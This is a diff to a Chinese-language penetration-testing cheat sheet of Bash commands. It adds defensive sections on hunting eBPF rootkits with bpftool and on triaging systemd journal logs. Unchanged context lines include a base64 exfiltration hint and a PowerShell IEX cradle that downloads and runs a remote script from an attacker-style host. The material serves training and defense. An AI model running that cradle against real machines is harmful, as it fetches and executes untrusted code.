@@ -2,7 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 常见的 Bash
+## 常用 Bash
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -121,7 +121,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## Windows上的Bash
+## 适用于 Windows 的 Bash
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -293,4 +293,46 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
+## eBPF 遥测 & Rootkit Hunting
+
+现代 rootkits（TripleCross、BPFDoor 等变体）越来越多地以隐藏的 eBPF 程序形式持久存在。使用 `bpftool`/`eBPFmon` 对你的主机群建立基线，以便在将它们分离之前发现未签名的程序、意外的 cgroup hooks，或恶意的 map 内容。
+```bash
+#Enumerate all eBPF programs, attach points, owning PIDs and map IDs
+sudo bpftool prog
+
+#Inspect suspicious bytecode + helper calls (replace 835 with the target program id)
+sudo bpftool prog dump xlated id 835 | less
+
+#List and dump program maps to reveal covert sockets/credentials (replace 104 accordingly)
+sudo bpftool map show id 104
+sudo bpftool map dump id 104 | hexdump -C
+
+#Verify kernel feature support before loading/patching custom probes
+sudo bpftool feature probe | less
+
+#TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
+sudo ebpfmon
+```
+将 bpftool 输出与预期的 NIC/cgroup 附着项进行关联；若出现由未授权 PID 拥有的 `xdp` 或 `kprobe` 程序，则很可能表明注入了 eBPF payload。
+
+## Journald 事件初步分析
+
+systemd-journald 会保存结构化元数据，因此你可以基于启动、严重级别、unit 或 UID 进行查询，而无需访问 `/var/log/*`。将过滤器与相对时间戳结合使用，可快速隔离攻击时间窗口或证明日志篡改。
+```bash
+journalctl --list-boots                                #Enumerate boot IDs with timestamps
+journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
+journalctl -u nginx.service --since="2025-06-01 01:00" --until="2025-06-01 02:00"
+journalctl -u ssh.service -f | grep "Failed password"  #Live brute-force monitoring
+journalctl _UID=0 --output=json-pretty --since "1 hour ago"
+journalctl --disk-usage                               #Quickly show journal size
+sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
+journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
+```
+在需要更严格的过滤时，添加 `--grep 'Invalid user' --case-sensitive` 或 `-k`（kernel ring buffer only），并记住 `_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME` 和 `_TRANSPORT` 选择器会叠加用于 multi-tenant hunts。
+
+## 参考资料
+
+- [eBPFmon: A new tool for exploring and interacting with eBPF applications](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [How to use the journalctl command to view Linux logs](https://www.hostinger.com/tutorials/journalctl-command)
+
 {{#include ../banners/hacktricks-training.md}}
